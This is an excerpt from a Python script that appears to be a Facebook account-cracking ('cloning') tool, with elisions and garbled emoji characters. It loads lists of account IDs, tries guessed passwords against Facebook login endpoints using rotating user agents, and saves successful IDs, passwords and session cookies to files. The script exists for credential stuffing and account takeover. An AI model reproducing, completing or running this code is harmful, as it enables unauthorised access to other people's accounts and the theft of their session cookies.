...
def banner():
	print(f'''
\x1b[1;97md8888b.  .d8b.  db   dD db    db ðŸ”¥
88  `8D d8' `8b 88 ,8P' 88    88 
88   88 88ooo88 88,8P   88    88 
88   88 88~~~88 88`8b   88    88 
88  .8D 88   88 88 `88. 88b  d88 
Y8888D' YP   YP YP   YD ~Y8888P' ðŸ”¥
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘ Creator  : TEAM 007                            â•‘
â•‘ Github   : https://github.com/SAJAD-HACKER       â•‘
â•‘ Facebook : SAJAD(RAJA)ðŸ™‚â¤ï¸                    â•‘
â•‘ Brothers :(RJ SUNNY)(BEZHAD KHAN)(RAJA BILAL)   â•‘
â•‘ NOTE     :   Free ToolðŸ˜“                         â•‘
...
def menu():
	...
	banner()
	print('')
	cetak(nel('[bold whit] 1. CRACK FILE\n 2. CHEK RESULTS\n 0. EXIT [bold green]')) 
...
class __crack__:
	...
	def plerr(self):
		...
		try:
			...
			print(f'\x1b[0m [+] TOTAL ID : '+str(len(id)));time.sleep(3)
			setting()
		except IOError:
			print("\033[1;91m\n [!] file %s not found\x1b[0m"%(fileX));time.sleep(2)
			fileclone()
#-------------------[ CRACK-PUBLIC ]----------------#
def dump_massal():
	try:
...
def setting():
	...
	print('') 
	cetak(nel('[bold whit]âž£1. CLONE JUST OLD IDZ \nâž£2. CLONE JUST NEW IDZ(RECOMEND)\nâž£3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
	...
	print('') 
	cetak(nel('[bold whit]âž£1. MOBILE\nâž£2. MBASIC\nâž£3. TOUCH\nâž£4. MTOUCH [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['1','01']:
...
def complete():
	...
	print(f'\x1b[1;37mSCANNING COMPLETE')
	print(f'\x1b[1;97mðŸ‘‰TOTAL ID : '+str(len(id)))
	print(f'\x1b[1;97mðŸ‘‰TOTAL OK : '+str(ok))
	print(f'\x1b[1;97mðŸ‘‰TOTAL CP : '+str(cp))
	print("%sâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"%(N))
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	print(f'\x1b[1;37m______________________________________________________________')
	print('')
	print(f'ðŸ‘‰\x1b[1;37mYOUR CLONEING STARTED')
	print(f'ðŸ‘‰\x1b[1;37mTOTAL IDZ : '+str(len(id)))
	print(f'ðŸ‘‰\x1b[1;37mYOUR OK ID SAVED: DAKU_OK.txt')
	print(f'ðŸ‘‰\x1b[1;37mYOUR CP ID SAVED: DAKU_CP.txt')
	print(f'ðŸ‘‰\x1b[1;37mYOUR CLONING STOP PRESS CTRL THAN Z')
	print(f'\x1b[1;37m______________________________________________________________')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}DAKUðŸ”¥{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\râ¤ï¸ {P}[{asu}DAKUðŸ”¥{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/SUNNY-KING/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='SUNNY-KING  OK'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/SUNNY-KING/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SUNNY-KING  OK[/bold green]'))
					ok+=1
					break
			else:
				continue
